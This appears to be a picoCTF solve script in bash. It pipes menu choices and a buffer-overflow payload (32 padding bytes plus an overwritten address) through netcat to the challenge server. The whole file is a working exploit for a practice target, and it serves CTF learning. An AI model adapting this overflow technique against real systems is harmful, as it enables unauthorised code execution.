#!/usr/bin/env bash
#!CMD: ./solve.sh

ENDPOINT="mimas.picoctf.net 58501"


(echo 1
echo 2
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\x00"
echo 3
echo 4
echo 5
) | nc $ENDPOINT
